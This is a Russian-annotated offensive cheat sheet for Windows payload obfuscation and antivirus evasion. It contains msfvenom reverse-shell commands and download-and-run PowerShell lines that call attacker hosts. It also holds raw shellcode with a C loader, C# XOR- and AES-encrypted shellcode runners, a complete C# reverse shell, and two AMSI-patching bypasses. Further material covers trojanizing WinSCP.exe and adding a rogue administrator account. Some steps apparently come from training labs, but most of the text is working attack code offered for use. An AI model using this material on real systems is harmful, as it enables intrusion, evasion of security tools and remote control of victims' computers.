# Obfuscations


# Обход блокировка скрипта

Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass 

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')

# Понизить версию Powershell

PowerShell.exe –version 2.0

Get-Host

exit

# Пока что рабочая обфускация

          https://www.youtube.com/watch?v=HFtvuz-9phI&t=84s
        
        - установить реверс

        https://github.com/H4cksploit/powershell-reverse-shell-one-liner/blob/main/powershell%20reverse%20shell%20one-liner.ps1

        - установить обфускатор Invoke-Stealth

        https://github.com/JoelGMSec/Invoke-Stealth.git
        
        sudo pwsh Invoke-Stealth.ps1 ./H4sploit.ps1 -technique All

# А еще можно попробовать поработать вот с этим

https://github.com/t3l3machus/Villain

# Была рабочая

need python2 pip2

#!/bin/bash

echo "Setting up pip2"
mkdir scripts && cd scripts
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
echo "Enter Sudo password is asked"
sleep 2
sudo python2 get-pip.py
pip2 install --upgrade setuptools
sudo apt-get install python-dev -y 
clear
echo "----------"
echo "DONE!!!"
echo "----------"

#ebowla

https://github.com/Genetic-Malware/Ebowla.git

https://github.com/ohoph/3bowla

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=9002 -f exe -a x64 -o reverse_9002.exe

python2 ebowla.py reverse_9002.exe genetic.config

./build_x64_go.sh output/go_symmetric_reverse_9002.exe.go rev_shell_9002.exe

wget https://golang.org/dl/go1.15.2.linux-amd64.tar.gz

tar -C /usr/local -xzf go1.15.2.linux-amd64.tar.gz to extract it.

export PATH=$PATH:/usr/local/go/bin

# PAYLOAD

    windows/x64/shell_reverse_tcp   Stageless payload
    
    windows/x64/shell/reverse_tcp   Staged payload

        -- кодеры msvenom шеллкода
        
    msfvenom --list encoders | grep excellent

    msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp

        --- обфускаторы msvenom

        msfvenom --list encrypt
        
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.194.27 LPORT=9001 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe


генерим пайлоад на с

msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp lhost=10.10.194.27 lport=9001 -f c

No encoder specified, outputting raw payload
Payload size: 193 bytes
Final size of c file: 835 bytes
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

Вставляем шелкод в сишку

#include <windows.h>
char stager[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };
int main()
{
        DWORD oldProtect;
        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
        int (*shellcode)() = (int(*)())(void*)stager;
        shellcode();
}


компилим в екзешку

i686-w64-mingw32-gcc calc.c -o calc-MSF.exe


# Реальный обход АВ

msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp

Сюда шелл код венома.......

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Droppr for Decrypting
            string key = "THMK3y123!";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //Original Shellcode here (csharp format)
            byte[] buf = new byte[460] { You Raw Shellcode };

            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}              



C:\> csc.exe Encrypter.cs
C:\> .\Encrypter.exe
qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=


Сюда закодированнную нагрузку.....

using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {

    string dataBS64 = "YOUR ENCRYPTED SHELLCODE";

    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "THMK3y123!";
    //Convert Key into bytes
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);


    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}

#  можно использовать упаковщик ConfuserEx

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp

    csc UnEncStagelessPayload.cs


Чтобы обойти палево в памяти нужно повторить попытку еще раз или сделать короткую команду msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp

или запустить еще один cmd.exe (антвирус спалит процесс но не последующие процессы)



# Иньекция пайлоада в файл

     msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe


# ОБФУСКАЦИЯ ИЗ ХТБ НА С#

 --- ПРОСТОЙ ШЕЛЛ

https://github.com/senzee1984/micr0_shell  

python.exe .\micr0_shell.py -i [IP] -p 8080 -l csharp

----ЗАТЕМ ПЕЙЛОАД HEX ЗАПИХИВАЕМ В CYBERCHEF

https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')AES_Encrypt(%7B'option':'Hex','string':'1f768bd57cbf021b251deb0791d8c197'%7D,%7B'option':'Hex','string':'ee7d63936ac1f286d8e4c5ca82dfa5e2'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Base64('A-Za-z0-9%2B/%3D')

(ГЛАВНОЕ УБРАТЬ ПЕРЕНОСЫ СТРОК)

----ЗАТЕМ BASE64 ПИХАЕМ В СКРИПТ

using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;


namespace NotMalware
{
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Shellcode (msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp)
            string bufEnc = "vET7JrlOiNB5nQ7lxuOvQ9o01/cgBt+Po+vttJqwpZjrgq8u+6gRzpAPMZEkfNh3WsY5EpEU1uBn9RjGWuXf4uUMM61EZxo7DRaYjpaTNv7mHyuhrUd/xY6LGLjgqgcBnnRacyEI7oNct8pi0T9KEW1YmK1WgGfqptGE3M5Wg1r9Bud5BweUJwftMt6JsgbIsMl0hwEVz5+uR8hjdvIuWVAw0lm4P069Ce9EraeguDNSnlcqhJnnOgu+lx/P4mo3tPHn2DNJyhe3Zl5JyQlccxBSKHU3gr3VzmIyNNk9ej7CznIR2F/7ZVnAx37BtSeobLn/7g9reAkhh6EzT+DibOBUTJBMBYn6tVXMC37LadYxtDj12Ms0uCVIH/dcy98QvHszSgd+F7LudIQBEShIm9w9Ow2EuMQzhuaZwE68dmrbEtDyn07awjy+LOcPSkWrYJXr+m2Dy/V4mQAJNjLz8vjfmWqXu5iaCGfbVpxrDlGIWiZYv9FHIpfGQ8HqmxRhQcg+cSASW0Fau64KiaMslo2dp9KCccgkCP5bsCtH3gUnn66pn/Vh8jbTBTaIfUjw9plsvxAdIfpqaghagU6C8eoGbWEmPWAa7I+/1E/F2Alat1wZS7LE8SJfLJrhkbSm";

// Decrypt shellcode
            Aes aes = Aes.Create();
            byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
            byte[] iv = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] buf;
            using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
            {
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (var msPlain = new System.IO.MemoryStream())
                    {
                        csDecrypt.CopyTo(msPlain);
                        buf = msPlain.ToArray();
                    }
                }
            }

            // Allocate RW space for shellcode
            IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x1000, 0x04);

            // Copy shellcode into allocated space
            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

            // Make shellcode in memory executable
            UInt32 lpflOldProtect;
            VirtualProtect(lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);

            // Execute the shellcode in a new thread
            UInt32 lpThreadId = 0;
            IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);

            // Wait until the shellcode is done executing
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
}

# Простой реверс шелл без обфускации

.\RShell 192.168.50.123 9001
nc -nlvp 9001



using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;

namespace RShell
{
    internal class Program
    {
        private static StreamWriter streamWriter; // Needs to be global so that HandleDataReceived() can access it

        static void Main(string[] args)
        {
            // Check for correct number of arguments
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: RShell.exe <IP> <Port>");
                return;
            }

            try
            {
                // Connect to <IP> on <Port>/TCP
                TcpClient client = new TcpClient();
                client.Connect(args[0], int.Parse(args[1]));

                // Set up input/output streams
                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);

                // Define a hidden PowerShell (-ep bypass -nologo) process with STDOUT/ERR/IN all redirected
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = "-ep bypass -nologo";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
                p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);

                // Start process and begin reading output
                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                // Re-route user-input to STDIN of the PowerShell process
                // If we see the user sent "exit", we can stop
                string userInput = "";
                while (!userInput.Equals("exit"))
                {
                    userInput = streamReader.ReadLine();
                    p.StandardInput.WriteLine(userInput);
                }

                // Wait for PowerShell to exit (based on user-inputted exit), and close the process
                p.WaitForExit();
                client.Close();
            }
            catch (Exception) { }
        }
        
        private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }
        }
    }
}



# AMSI EVASION

1----------

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@;
$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);
$hModule = [Kernel32]::LoadLibrary("amsi.dll");
$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");
$lpflOldProtect = 0;
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;
$marshal = [System.Runtime.InteropServices.Marshal];
$marshal::Copy($patch, 0, $lpAddress, $patch.Length);
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;

2---------------

$utils = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');
$context = $utils.GetField('amsi'+'Context','NonPublic,Static');
$session = $utils.GetField('amsi'+'Session','NonPublic,Static');

$marshal = [System.Runtime.InteropServices.Marshal];
$newContext = $marshal::AllocHGlobal(4);

$context.SetValue($null,[IntPtr]$newContext);
$session.SetValue($null,$null);



# Open-Source Software Obfuscation

Обфускаатор на cybercheff

https://gchq.github.io/CyberChef/#recipe=Gzip('Dynamic%20Huffman%20Coding','','',false)To_Base64('A-Za-z0-9%2B/%3D')



function Invoke-Seatbelt {
    [CmdletBinding()]
    Param (
        [String]
        $args = " "
    )

    $gzipB64 = "H4sIABeUPmYA/+39BZyV1RY3AD/nORUTTBBDhtTAkCElNVQoJaGoKIyEoMDgGUrH0UHCwu4GwWt3NyhmXLEzQPHaGdfG779iPzVnAO/1vu/7fb/vxF57rd1da6899uCzrLBlWRH8//zTsu4FpM9ghbv6VOOf2/z+XOvO5PMt7w2Neb7l5LnzKlosSpcfkS5b0GJm2cKF5YtbHD67RXrJwhbzFrYYNn5SiwXls2Z3z<SNIP>"
    $gzipBytes = [Convert]::FromBase64String($gzipB64);
    $gzipMemoryStream = New-Object IO.MemoryStream(, $gzipBytes);
    $gzipStream = New-Object System.IO.Compression.GzipStream($gzipMemoryStream, [IO.Compression.CompressionMode]::Decompress);
    $seatbeltMemoryStream = New-Object System.IO.MemoryStream;
    $gzipStream.CopyTo($seatbeltMemoryStream);

    $seatbeltArray = $seatbeltMemoryStream.ToArray();
    $seatbelt = [System.Reflection.Assembly]::Load($seatbeltArray);
    $oldConsoleOut = [Console]::Out;
    $StringWriter = New-Object IO.StringWriter;
    [Console]::SetOut($StringWriter);
    [Seatbelt.Program]::Main($args.Split(" "));
    [Console]::SetOut($OldConsoleOut);
    $Results = $StringWriter.ToString();
    $Results
}


$webClient = New-Object Net.WebClient;
$webClient.DownloadString('http://PWNIP:PWNPO/AMSIBypass.ps1') | IEX;
$webClient.DownloadString('http://PWNIP:PWNPO/Invoke-Seatbelt.ps1') | IEX;
